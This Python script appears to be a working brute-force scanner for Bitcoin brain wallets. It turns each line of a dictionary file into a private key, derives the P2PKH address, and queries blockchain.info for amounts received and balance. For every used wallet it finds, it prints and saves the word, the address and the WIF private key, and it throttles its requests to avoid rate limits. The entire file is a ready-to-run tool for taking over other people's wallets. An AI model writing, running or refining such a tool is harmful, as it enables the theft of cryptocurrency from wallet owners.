#!/usr/bin/env python3
"""
brute_p2pkh_seq_blockchain.py
Single-threaded P2PKH scanner using coincurve + blockchain.info /q endpoints,
with a mandatory sleep between addresses to avoid rate-limits.

Requirements:
    pip3 install coincurve requests base58

Usage:
    python3 brute_p2pkh_seq_blockchain.py --dict dictionary.txt --out found.txt
"""
from __future__ import annotations
import argparse, io, sys, time, random, logging
import binascii, hashlib
import requests, base58
from coincurve import PrivateKey

# ---------- crypto helpers ----------
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check_encode(prefix: bytes, payload20: bytes) -> str:
    raw = prefix + payload20
    checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    return base58.b58encode(raw + checksum).decode()

def privhex_from_passphrase(passphrase: str) -> str:
    return binascii.hexlify(sha256(passphrase.encode('utf-8'))).decode()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = binascii.unhexlify(priv_hex)
    payload = b'\x80' + b
    if compressed:
        payload += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + checksum).decode()

def p2pkh_from_pubkey(pubkey_bytes: bytes) -> str:
    rip = hash160(pubkey_bytes)
    return base58check_encode(b'\x00', rip)

# ---------- blockchain.info raw numeric fetcher ----------
def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    text = r.text.strip()
    # try parse as float directly
    try:
        return float(text)
    except Exception:
        pass
    # fallback try parse JSON numeric fields if any
    try:
        j = r.json()
        for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received"):
            if isinstance(j, dict) and key in j:
                return float(j[key])
    except Exception:
        pass
    raise ValueError("Unable to parse numeric from response: " + (text[:200] if text else "<empty>"))

# ---------- main single-threaded loop ----------
def main():
    ap = argparse.ArgumentParser(description="Sequential P2PKH bruteforce (coincurve) with blockchain.info /q and sleep between addresses")
    ap.add_argument("--dict", "-d", default="dictionary.txt")
    ap.add_argument("--out", "-o", default="found.txt")
    ap.add_argument("--sleep", type=float, default=0.6, help="minimum sleep (seconds) between addresses (default 0.6)")
    ap.add_argument("--jitter", type=float, default=0.05, help="extra random jitter (seconds) added to sleep, default 0.05")
    ap.add_argument("--debug", action="store_true")
    ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
    ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    # verify coincurve available
    try:
        _ = PrivateKey(b'\x01' * 32)
    except Exception as e:
        logging.error("coincurve not available or failing: %s", e)
        sys.exit(1)

    # open dictionary and output
    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)

    try:
        fout = open(args.out, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Cannot open output file: %s", e)
        sys.exit(1)

    session = requests.Session()
    total = 0
    checked = 0
    found = 0
    start_time = time.time()

    try:
        for raw in fdict:
            word = raw.strip()
            if not word:
                continue
            total += 1

            # derive
            try:
                priv_hex = privhex_from_passphrase(word)
                pk = PrivateKey(bytes.fromhex(priv_hex))
                pub = pk.public_key.format(compressed=True)
                addr = p2pkh_from_pubkey(pub)
                wif = wif_from_privhex(priv_hex, compressed=True)
            except Exception as e:
                logging.debug("Derivation failed for '%s': %s", word, e)
                continue

            # fetch received (with retries)
            received = 0.0
            max_retries = 3
            for attempt in range(max_retries):
                try:
                    url = f"{args.base_received}/{addr}"
                    val = _get_raw_numeric(session, url, timeout=20.0)
                    received = float(val)
                    break
                except Exception as e:
                    backoff = (0.5 + random.random()) * (2 ** attempt)
                    logging.debug("Received fetch error for %s: %s — retry %d sleeping %.2fs", addr, e, attempt+1, backoff)
                    time.sleep(backoff)

            checked += 1

            if received == 0.0:
                # always sleep at least args.sleep + jitter between addresses
                s = args.sleep + (random.random() * args.jitter)
                time.sleep(s)
                continue

            # fetch balance (with retries)
            balance = 0.0
            for attempt in range(max_retries):
                try:
                    url = f"{args.base_balance}/{addr}"
                    val = _get_raw_numeric(session, url, timeout=20.0)
                    balance = float(val)
                    break
                except Exception as e:
                    backoff = (0.5 + random.random()) * (2 ** attempt)
                    logging.debug("Balance fetch error for %s: %s — retry %d sleeping %.2fs", addr, e, attempt+1, backoff)
                    time.sleep(backoff)

            # LOUD OUTPUT + write
            try:
                print("\n=== USED WALLET FOUND ===")
                print(f"WORD: {word}")
                print(f"ADDRESS (p2pkh): {addr}")
                print(f"WIF: {wif}")
                print(f"RECEIVED RAW: {received}")
                print(f"CURRENT BALANCE RAW: {balance}")
                print("========================\n")
                fout.write(f"{word},{addr},{wif},{received},{balance}\n")
                fout.flush()
                found += 1
            except Exception:
                pass

            # sleep at least args.sleep + jitter between addresses
            s = args.sleep + (random.random() * args.jitter)
            time.sleep(s)

            # periodic logging
            if total % 1000 == 0:
                elapsed = time.time() - start_time
                logging.info("Processed %d words — checked:%d found:%d — avg %.2f w/s", total, checked, found, total / max(1.0, elapsed))

    except KeyboardInterrupt:
        logging.info("Interrupted by user")

    finally:
        session.close()
        fdict.close()
        fout.close()
        elapsed = time.time() - start_time
        logging.info("Finished. Total read: %d, checked:%d found:%d, elapsed %.1fs", total, checked, found, elapsed)

if __name__ == "__main__":
    main()